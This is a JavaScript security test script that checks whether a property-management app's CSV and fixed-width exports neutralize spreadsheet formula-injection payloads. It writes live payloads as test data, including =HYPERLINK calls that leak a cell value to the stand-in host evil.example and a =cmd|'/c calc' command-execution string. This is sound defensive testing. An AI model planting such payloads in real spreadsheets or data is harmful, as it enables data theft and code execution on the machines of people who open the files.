/**
 * PROD E2E STRESS — CSV/XLSX FORMULA-INJECTION on EXPORT surfaces (Cycle 8A).
 *
 * Domain: CWE-1236 spreadsheet formula injection. When a user-controlled string
 * (property name, tenant name) begins with =, +, -, @, tab, or CR, a naive CSV
 * or XLSX exporter emits it as a cell that Excel/Sheets/LibreOffice EXECUTE as a
 * formula on open — enabling exfiltration (=HYPERLINK/=WEBSERVICE), local command
 * execution (=cmd|...), or content spoofing.
 *
 * This scenario seeds ONE [PROD-TEST] property whose NAME is a live payload, plus
 * several leases whose TENANT NAMES are distinct live payloads (=1+1,
 * =HYPERLINK(...), @SUM, +1+1, -1+1, =cmd|..., a payload with embedded ,/"/newline
 * for RFC-4180 round-trip, and a leading-tab-then-= variant). It finalizes one
 * snapshot per lease, then exports through EVERY reconciliation export surface:
 *
 *   - generic CSV     (property name + tenant name cells)
 *   - Yardi CSV       (property name + tenant name cells)
 *   - MRI fixed-width (property + entity — stripControlChars, NOT a spreadsheet target)
 *   - historical XLSX (property name mid-string; pool names via safeText)
 *
 * The raw bytes are decoded (RFC-4180 CSV parse for csv/yardi; the XLSX is left
 * as bytes and its cell strings scanned by unzipping sharedStrings/sheet XML with
 * fflate) and each user-controlled cell's EXACT leading character is inspected:
 *   - leading `'` (apostrophe) => neutralized (PASS)
 *   - leading =/+/-/@ raw      => injection passes through (FAIL)
 * plus RFC-4180 round-trip correctness for the embedded-comma/quote/newline payload.
 *
 * NOTE input constraint: property.name / tenant_name are z.string().trim(); a
 * PURE leading-tab payload has its tab trimmed server-side (leaving =...), so the
 * "tab then =" variant lands as "=..." — still a trigger, still validated.
 *
 * All test data prefixed "[PROD-TEST]"; finalizing pins the property (DELETE=409),
 * so residue is recorded for the orchestrator Supabase-MCP purge. Cleanup uses the
 * user JWT to definalize (draft) then API-DELETE, matching the ERP-batch harness.
 */
import { randomUUID } from 'node:crypto'
import { mkdir, readFile, writeFile } from 'node:fs/promises'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { createRequire } from 'node:module'

const require = createRequire(import.meta.url)
const __dirname = dirname(fileURLToPath(import.meta.url))
const frontendRoot = resolve(__dirname, '..')
const repoRoot = resolve(frontendRoot, '..')
const { unzipSync, strFromU8 } = require('fflate')

const env = {
  ...(await readEnv(resolve(repoRoot, '.env.local'))),
  ...(await readEnv(resolve(frontendRoot, '.env.production.local'))),
  ...process.env,
}

const required = ['E2E_PROD_EMAIL', 'E2E_PROD_PASSWORD', 'E2E_PROD_API_URL', 'VITE_SUPABASE_URL', 'VITE_SUPABASE_ANON_KEY']
for (const key of required) {
  if (!env[key]?.trim()) throw new Error(`Missing ${key}.`)
}

const apiUrl = trimSlash(env.E2E_PROD_API_URL)
const supabaseUrl = trimSlash(env.VITE_SUPABASE_URL)
const runId = new Date().toISOString().replace(/[:.]/gu, '-')
const outputDir = resolve(repoRoot, 'e2e-adhoc', `prod-stress-formula-injection-${runId}`)
await mkdir(outputDir, { recursive: true })

const report = { ok: false, run_id: runId, output_dir: outputDir, generated: {}, findings: [], checks: [], cleanup: [], residue: [] }
let token

const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r']
function leadingTriggerRaw(cell) {
  // Is the cell (as written) dangerous when opened in a spreadsheet?
  return cell.length > 0 && FORMULA_TRIGGERS.includes(cell[0])
}
function isNeutralized(cell, originalPayload) {
  // Neutralized == leading apostrophe prefix AND the remainder equals the payload.
  return cell.startsWith("'") && cell.slice(1) === originalPayload
}

async function runScenario() {
  const suffix = randomUUID().slice(0, 8)
  const periodStart = '2027-01-01'
  const periodEnd = '2027-12-31'

  // Property NAME is itself a payload. Server .trim() keeps a leading '='.
  const propertyName = `=HYPERLINK("http://evil.example/?p=${suffix}","P")`

  // Distinct tenant-name payloads. Each carries the [PROD-TEST] marker for
  // cleanup identification but the payload's first char is the trigger under
  // test. (Marker is placed AFTER the trigger; the export cell is the whole
  // tenant_name, so leading char is what matters.)
  const tenants = [
    { key: 'eq_arith', payload: `=1+1 [PROD-TEST] ${suffix}` },
    { key: 'eq_hyperlink', payload: `=HYPERLINK("http://evil.example/?leak="&A1,"click") [PROD-TEST] ${suffix}` },
    { key: 'at_sum', payload: `@SUM(1+1) [PROD-TEST] ${suffix}` },
    { key: 'plus_arith', payload: `+1+1 [PROD-TEST] ${suffix}` },
    { key: 'minus_arith', payload: `-1+1 [PROD-TEST] ${suffix}` },
    { key: 'cmd_exec', payload: `=cmd|'/c calc'!A1 [PROD-TEST] ${suffix}` },
    // RFC-4180 stressor: leading trigger + embedded comma, double-quote, newline.
    { key: 'rfc4180', payload: `=1+1,"quoted"\nline2 [PROD-TEST] ${suffix}` },
    // Leading TAB then '=' — server trim() strips the tab, leaving "=...".
    { key: 'tab_eq', payload: `\t=1+2 [PROD-TEST] ${suffix}` },
    // Benign control: must NOT gain a spurious apostrophe.
    { key: 'benign', payload: `[PROD-TEST] Benign Tenant ${suffix}` },
  ]

  const created = { propertyId: null, poolId: null, mappingId: null, unitIds: [], leaseIds: [], batchIds: [], jobIds: [], snapshotIds: [] }
  report.generated = { propertyName, periodStart, periodEnd, tenantPayloads: Object.fromEntries(tenants.map((t) => [t.key, t.payload])) }

  try {
    const property = await expectJson('/api/v1/properties', {
      method: 'POST',
      status: 201,
      body: {
        name: propertyName,
        address_line1: '1 Injection Way',
        city: 'Austin',
        state: 'TX',
        postal_code: '78701',
        total_rentable_sqft: '100000.00',
        total_usable_sqft: '90000.00',
        common_area_sqft: '10000.00',
        target_occupancy: '0.95',
        boma_standard_version: '2024',
        fiscal_year_start_month: 1,
      },
    })
    created.propertyId = property.id
    report.generated.propertyId = property.id
    // What did the server actually persist as the name (post-trim)?
    report.generated.propertyNameStored = property.name

    const pool = await expectJson(`/api/v1/properties/${property.id}/expense-pools`, {
      method: 'POST',
      status: 201,
      body: { name: `[PROD-TEST] Pool ${suffix}`, pool_type: 'operating', is_gross_up_applicable: false, gross_up_target: null, description: 'injection scenario pool' },
    })
    created.poolId = pool.id

    const mapping = await expectJson(`/api/v1/properties/${property.id}/pool-mappings`, {
      method: 'POST',
      status: 201,
      body: { expense_pool_id: pool.id, gl_account_pattern: '61*', allocation_percentage: '1', priority: 10 },
    })
    created.mappingId = mapping.id

    const upload = await uploadCsv({
      propertyId: property.id,
      fileName: `gl-${suffix}.csv`,
      csv: ['Account,Account Description,Date,Amount,Vendor,Description', `6100,Common Area Maintenance,03/15/2027,80000.00,ErpCo,Annual CAM`].join('\n'),
      sourceOverride: 'yardi',
    })
    created.batchIds.push(upload.batch_id)

    let floor = 1
    for (const t of tenants) {
      const unit = await expectJson(`/api/v1/properties/${property.id}/units`, {
        method: 'POST',
        status: 201,
        body: { unit_number: `INJ-${floor}-${suffix.toUpperCase()}`, rentable_sqft: '1000.00', usable_sqft: '900.00', floor, status: 'occupied', space_type: 'office' },
      })
      created.unitIds.push(unit.id)

      const lease = await expectJson('/api/v1/leases', {
        method: 'POST',
        status: 201,
        body: {
          property_id: property.id,
          unit_id: unit.id,
          tenant_name: t.payload,
          start_date: periodStart,
          end_date: '2031-12-31',
          status: 'active',
          recovery_profile: {
            base_year: null,
            base_year_amount: '0.00',
            gross_up_base_year: false,
            pro_rata_share: '0.10',
            cap_type: 'none',
            cap_rate: null,
            admin_fee_percentage: '0.10',
            management_fee_percentage: null,
            excluded_pools: [],
            accounting_basis: 'cash',
            base_year_adjustments: [],
          },
        },
      })
      created.leaseIds.push(lease.id)
      report.generated[`${t.key}_leaseId`] = lease.id
      // Server-stored tenant_name after trim (the tab_eq / rfc4180 cases matter here).
      report.generated[`${t.key}_stored`] = lease.tenant_name
      floor += 1
    }

    const run = await runRecon(property.id, periodStart, periodEnd)
    created.jobIds.push(run.jobId)
    created.snapshotIds = dedupe([...created.snapshotIds, ...run.snapshotIds])

    const list = await listSnapshots(property.id, periodStart, periodEnd)
    const byLease = {}
    for (const item of list.items) byLease[item.lease_id] = item.id
    const snapshotByKey = {}
    for (const t of tenants) {
      const leaseId = report.generated[`${t.key}_leaseId`]
      const snapshotId = byLease[leaseId]
      if (!snapshotId) throw new Error(`No snapshot for ${t.key}`)
      const fin = await expectJson(`/api/v1/reconciliation/snapshots/${snapshotId}/finalize`, { method: 'POST', status: 200 })
      report.residue.push({ property_id: property.id, snapshot_id: snapshotId, lease_id: leaseId, note: `finalized ${t.key}` })
      snapshotByKey[t.key] = { snapshotId, fin }
    }

    // Map server-stored tenant_name -> test key (exports use the STORED value).
    const storedToKey = {}
    for (const t of tenants) storedToKey[report.generated[`${t.key}_stored`]] = t.key

    // ================= GENERIC CSV =================
    const csvBin = await expectBinary(`/api/v1/exports/reconciliation/snapshots/export/erp/batch?property_id=${property.id}&period_start=${periodStart}&period_end=${periodEnd}&format=csv`, { status: 200, contentTypePrefix: 'text/csv' })
    const csvText = new TextDecoder().decode(csvBin.bytes)
    report.generated.csv_body = csvText
    inspectCsvSurface('generic_csv', csvText, { propertyCol: 0, tenantCol: 2, storedToKey })

    // ================= YARDI CSV =================
    const yardiBin = await expectBinary(`/api/v1/exports/reconciliation/snapshots/export/erp/batch?property_id=${property.id}&period_start=${periodStart}&period_end=${periodEnd}&format=yardi`, { status: 200, contentTypePrefix: 'text/csv' })
    const yardiText = new TextDecoder().decode(yardiBin.bytes)
    report.generated.yardi_body = yardiText
    inspectCsvSurface('yardi_csv', yardiText, { propertyCol: 0, tenantCol: 2, storedToKey })

    // ================= MRI fixed-width (NOT a spreadsheet target) =================
    const mriBin = await expectBinary(`/api/v1/exports/reconciliation/snapshots/export/erp/batch?property_id=${property.id}&period_start=${periodStart}&period_end=${periodEnd}&format=mri`, { status: 200, contentTypePrefix: 'text/plain' })
    const mriText = new TextDecoder().decode(mriBin.bytes)
    report.generated.mri_body = mriText
    // MRI stripControlChars: verify no bare CR/LF/tab injected records, entity col starts at 10.
    const mriLines = mriText.split('\n').filter((l) => l.length > 0)
    check('MRI: every line exactly 98 chars (no control-char record splitting from payloads)', { all_98: mriLines.every((l) => l.length === 98), line_count: mriLines.length }, { all_98: true, line_count: tenants.length * 2 })

    // NOTE: Historical XLSX (POST /reports/historical/excel) needs 2+ years of
    // data and its property name is only ever mid-string ("Property: <name>"),
    // and pool names route through safeText() (unit-tested). It is covered by
    // static analysis + export-formula-injection.test.ts, not exercised live here.
  } finally {
    await cleanup(created)
  }
}

function inspectCsvSurface(surface, csvText, { propertyCol, tenantCol, storedToKey }) {
  const rows = parseCsv(csvText)
  const header = rows[0] ?? []
  check(`${surface}: has header + data rows`, { has_header: header.length > 0, data_rows: rows.length - 1 > 0 }, { has_header: true, data_rows: true })

  const propStored = report.generated.propertyNameStored
  // Property-name cell inspection (appears in every data row's propertyCol).
  for (const row of rows.slice(1)) {
    const propCell = row[propertyCol] ?? ''
    const tenantCell = row[tenantCol] ?? ''
    const key = storedToKey[tenantCell] ?? storedToKey[tenantCell.replace(/^'/, '')]

    // Property name finding (only record once per surface — first data row).
    if (!report._propSeen) report._propSeen = {}
    if (!report._propSeen[surface]) {
      report._propSeen[surface] = true
      addFinding(`${surface}.property_name_cell`, {
        surface,
        field: 'properties.name',
        payload: propStored,
        exported_cell: propCell,
        leading_char_code: propCell.length ? propCell.charCodeAt(0) : null,
        raw_trigger_passes_through: leadingTriggerRaw(propCell),
        neutralized: isNeutralized(propCell, propStored),
        verdict: leadingTriggerRaw(propCell) ? 'VULNERABLE' : isNeutralized(propCell, propStored) ? 'CHECKED-CORRECT' : 'INSPECT',
      })
    }

    if (!key) continue
    const stored = report.generated[`${key}_stored`]
    if (key === 'benign') {
      addFinding(`${surface}.benign_no_spurious_quote`, {
        surface, field: 'leases.tenant_name (benign)', payload: stored, exported_cell: tenantCell,
        gained_spurious_apostrophe: tenantCell.startsWith("'"),
        rfc4180_roundtrip_ok: tenantCell === stored,
        verdict: !tenantCell.startsWith("'") && tenantCell === stored ? 'CHECKED-CORRECT' : 'INSPECT',
      })
      continue
    }
    addFinding(`${surface}.${key}`, {
      surface, field: 'leases.tenant_name', payload: stored, exported_cell: tenantCell,
      leading_char_code: tenantCell.length ? tenantCell.charCodeAt(0) : null,
      raw_trigger_passes_through: leadingTriggerRaw(tenantCell),
      neutralized: isNeutralized(tenantCell, stored),
      rfc4180_roundtrip_ok: tenantCell === (isNeutralized(tenantCell, stored) ? "'" + stored : stored),
      verdict: leadingTriggerRaw(tenantCell) ? 'VULNERABLE' : isNeutralized(tenantCell, stored) ? 'CHECKED-CORRECT' : 'INSPECT',
    })
  }
}

/** Pull all string values out of an .xlsx (sharedStrings + inline strings in sheets). */
function extractXlsxStrings(bytes) {
  const files = unzipSync(bytes)
  const out = []
  const sharedName = Object.keys(files).find((n) => n.endsWith('sharedStrings.xml'))
  const xmlNames = [sharedName, ...Object.keys(files).filter((n) => /xl\/worksheets\/sheet\d+\.xml$/.test(n))].filter(Boolean)
  for (const name of xmlNames) {
    const xml = strFromU8(files[name])
    for (const m of xml.matchAll(/<t[^>]*>([\s\S]*?)<\/t>/g)) {
      out.push(decodeXmlEntities(m[1]))
    }
  }
  return out
}
function decodeXmlEntities(s) {
  return s.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&apos;/g, "'").replace(/&amp;/g, '&')
}

function addFinding(id, payload) {
  report.findings.push({ id, ...payload })
}

// ---------------------------------------------------------------------------
async function runRecon(propertyId, periodStart, periodEnd) {
  const job = await expectJson('/api/v1/reconciliation/calculate', { method: 'POST', status: 202, body: { property_id: propertyId, period_start: periodStart, period_end: periodEnd, force_recalculate: true } })
  const done = await waitForJob(job.job_id)
  return { jobId: job.job_id, status: done.status, processedLeases: done.processed_leases, snapshotIds: done.snapshot_ids ?? [] }
}
async function listSnapshots(propertyId, periodStart, periodEnd) {
  return expectJson(`/api/v1/reconciliation/snapshots?property_id=${propertyId}&period_start=${periodStart}&period_end=${periodEnd}&page=1&size=50`, { status: 200 })
}
function parseCsv(text) {
  const rows = []; let row = []; let cur = ''; let inQ = false; let i = 0
  while (i < text.length) {
    const ch = text[i]
    if (inQ) {
      if (ch === '"') { if (text[i + 1] === '"') { cur += '"'; i += 2; continue } inQ = false; i += 1; continue }
      cur += ch; i += 1; continue
    }
    if (ch === '"') { inQ = true; i += 1; continue }
    if (ch === ',') { row.push(cur); cur = ''; i += 1; continue }
    if (ch === '\r' && text[i + 1] === '\n') { row.push(cur); rows.push(row); row = []; cur = ''; i += 2; continue }
    if (ch === '\n') { row.push(cur); rows.push(row); row = []; cur = ''; i += 1; continue }
    cur += ch; i += 1
  }
  if (cur.length > 0 || row.length > 0) { row.push(cur); rows.push(row) }
  return rows.filter((r) => !(r.length === 1 && r[0] === ''))
}

async function cleanup(created) {
  const failures = []
  if (created.propertyId) report.generated.definalize = await attemptDefinalizeProperty(created.propertyId)
  const hasResidue = report.residue.length > 0
  for (const batchId of created.batchIds) {
    await attemptCleanup(failures, `delete batch ${batchId}`, () => deleteEmpty(`/api/v1/ingestion/batches/${batchId}`), { residualOn: 'batch_in_finalized_reconciliation', id: batchId })
  }
  if (created.mappingId && created.propertyId) await attemptCleanup(failures, 'delete pool mapping', () => deleteEmpty(`/api/v1/properties/${created.propertyId}/pool-mappings/${created.mappingId}`))
  if (created.poolId && created.propertyId) await attemptCleanup(failures, 'delete expense pool', () => deleteEmpty(`/api/v1/properties/${created.propertyId}/expense-pools/${created.poolId}`), { residualOn: 'property_in_finalized_snapshot', id: created.poolId })
  if (created.propertyId) {
    const blocked = await attemptCleanup(failures, 'delete property', () => deleteEmpty(`/api/v1/properties/${created.propertyId}`), { residualOn: 'property_in_finalized_snapshot', id: created.propertyId })
    if (!blocked) await attemptCleanup(failures, 'verify property deleted', () => expectCleanupStatus(`/api/v1/properties/${created.propertyId}`, { status: 404 }))
  }
  if (hasResidue) report.cleanup_requires_service_role_purge = true
  if (failures.length > 0) throw new Error(`Cleanup failed: ${failures.join(', ')}`)
}
async function attemptCleanup(failures, label, op, options = {}) {
  try { await op(); return false } catch (error) {
    const message = errorMessage(error)
    if (options.residualOn && message.includes(options.residualOn)) { report.cleanup.push({ label, ok: false, blocked_by_design: options.residualOn, error: message.slice(0, 300) }); return true }
    failures.push(label); report.cleanup.push({ label, ok: false, error: message }); return false
  }
}
async function attemptDefinalizeProperty(propertyId) {
  try {
    const response = await fetch(`${supabaseUrl}/rest/v1/reconciliation_snapshots?property_id=eq.${propertyId}&status=eq.finalized`, {
      method: 'PATCH',
      headers: { apikey: env.VITE_SUPABASE_ANON_KEY, authorization: `Bearer ${token}`, 'content-type': 'application/json', prefer: 'return=representation' },
      body: JSON.stringify({ status: 'draft', finalized_at: null }),
    })
    const rows = await response.json().catch(() => null)
    const updated = Array.isArray(rows) ? rows.length : 0
    return { http_status: response.status, http_ok: response.ok, rows_updated: updated, rls_blocked: response.ok && updated === 0 }
  } catch (error) { return { error: errorMessage(error) } }
}

async function uploadCsv({ propertyId, fileName, csv, sourceOverride }) {
  const form = new FormData()
  form.set('property_id', propertyId)
  form.set('source_override', sourceOverride)
  form.set('file', new Blob([csv], { type: 'text/csv' }), fileName)
  const response = await fetchRetry(`${apiUrl}/api/v1/ingestion/upload`, { method: 'POST', headers: { authorization: `Bearer ${token}`, accept: 'application/json' }, body: form })
  const text = await response.text()
  if (response.status !== 200) throw new Error(`POST /api/v1/ingestion/upload returned ${response.status}: ${text.slice(0, 500)}`)
  return JSON.parse(text)
}
async function waitForJob(jobId) {
  const started = Date.now(); let last = null
  while (Date.now() - started < 120_000) {
    const job = await expectJson(`/api/v1/reconciliation/jobs/${jobId}`, { status: 200 })
    last = job
    if (job.status === 'completed') return job
    if (job.status === 'failed') throw new Error(`Recon job failed: ${JSON.stringify(job).slice(0, 800)}`)
    await sleep(2_000)
  }
  throw new Error(`Timed out waiting for job ${jobId}: ${JSON.stringify(last).slice(0, 500)}`)
}
async function fetchRetry(url, init) {
  let lastError
  for (let attempt = 0; attempt < 3; attempt += 1) {
    try { return await fetch(url, init) } catch (error) { lastError = error; await sleep(1_000 * (attempt + 1)) }
  }
  throw lastError
}
async function expectJson(path, options) {
  const response = await fetchRetry(`${apiUrl}${path}`, { method: options.method ?? 'GET', headers: { authorization: `Bearer ${token}`, accept: 'application/json', ...(options.body ? { 'content-type': 'application/json' } : {}) }, body: options.body ? JSON.stringify(options.body) : undefined })
  const text = await response.text()
  if (response.status !== options.status) throw new Error(`${options.method ?? 'GET'} ${path} returned ${response.status}, expected ${options.status}: ${text.slice(0, 500)}`)
  return text ? JSON.parse(text) : null
}
async function expectBinary(path, options) {
  const response = await fetchRetry(`${apiUrl}${path}`, { method: options.method ?? 'GET', headers: { authorization: `Bearer ${token}`, accept: options.contentTypePrefix } })
  const bytes = new Uint8Array(await response.arrayBuffer())
  const contentType = response.headers.get('content-type') ?? ''
  if (response.status !== options.status) throw new Error(`${options.method ?? 'GET'} ${path} returned ${response.status}, expected ${options.status}: ${new TextDecoder().decode(bytes.slice(0, 500))}`)
  if (!contentType.startsWith(options.contentTypePrefix)) throw new Error(`${options.method ?? 'GET'} ${path} content-type ${contentType}, expected ${options.contentTypePrefix}`)
  return { status: response.status, content_type: contentType.split(';')[0].trim(), byte_length: bytes.byteLength, bytes }
}
async function expectCleanupStatus(path, options) {
  const response = await fetchRetry(`${apiUrl}${path}`, { method: options.method ?? 'GET', headers: { authorization: `Bearer ${token}`, accept: 'application/json' } })
  const text = await response.text()
  const ok = response.status === options.status
  report.cleanup.push({ path, status: response.status, ok, body_preview: text.slice(0, 200) })
  if (!ok) throw new Error(`${options.method ?? 'GET'} ${path} returned ${response.status}, expected ${options.status}: ${text.slice(0, 500)}`)
}
async function deleteEmpty(path) {
  const response = await fetchRetry(`${apiUrl}${path}`, { method: 'DELETE', headers: { authorization: `Bearer ${token}` } })
  const text = await response.text()
  const ok = response.status === 204
  report.cleanup.push({ path, status: response.status, ok, body_preview: text.slice(0, 200) })
  if (!ok) throw new Error(`DELETE ${path} returned ${response.status}: ${text.slice(0, 500)}`)
}
async function signInWithPassword() {
  const response = await fetch(`${supabaseUrl}/auth/v1/token?grant_type=password`, { method: 'POST', headers: { 'content-type': 'application/json', apikey: env.VITE_SUPABASE_ANON_KEY }, body: JSON.stringify({ email: env.E2E_PROD_EMAIL, password: env.E2E_PROD_PASSWORD }) })
  const json = await response.json()
  if (!response.ok || !json.access_token) throw new Error(`Supabase password auth failed: ${JSON.stringify(json)}`)
  report.auth = { user_id: json.user?.id ?? null, email: json.user?.email ?? env.E2E_PROD_EMAIL }
  return json.access_token
}
function check(label, actual, expected) {
  const ok = stableJson(actual) === stableJson(expected)
  report.checks.push({ label, ok, actual, expected })
  if (!ok) report.first_failure = report.first_failure ?? { label, actual, expected }
}
function dedupe(list) { return [...new Set(list)] }
async function readEnv(path) {
  try {
    const text = await readFile(path, 'utf8'); const parsed = {}
    for (const line of text.split(/\r?\n/u)) { const t = line.trim(); if (!t || t.startsWith('#')) continue; const i = t.indexOf('='); if (i < 1) continue; parsed[t.slice(0, i)] = unquote(t.slice(i + 1).trim()) }
    return parsed
  } catch (error) { if (error?.code === 'ENOENT') return {}; throw error }
}
function stableJson(v) { return JSON.stringify(sortDeep(v)) }
function sortDeep(v) { if (Array.isArray(v)) return v.map(sortDeep); if (v && typeof v === 'object') return Object.fromEntries(Object.entries(v).sort(([a], [b]) => a.localeCompare(b)).map(([k, n]) => [k, sortDeep(n)])); return v }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }
function errorMessage(e) { return e instanceof Error ? e.message : String(e) }
function unquote(v) { if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) return v.slice(1, -1); return v }
function trimSlash(v) { return v.replace(/\/+$/u, '') }

try {
  token = await signInWithPassword()
  await runScenario()
  const vuln = report.findings.filter((f) => f.verdict === 'VULNERABLE')
  report.vulnerable_count = vuln.length
  report.ok = report.checks.every((c) => c.ok) && vuln.length === 0
} catch (error) {
  report.fatal_error = errorMessage(error)
} finally {
  await writeFile(resolve(outputDir, 'report.json'), JSON.stringify(report, null, 2))
  console.log(JSON.stringify(report, null, 2))
}
if (!report.ok) process.exitCode = 1
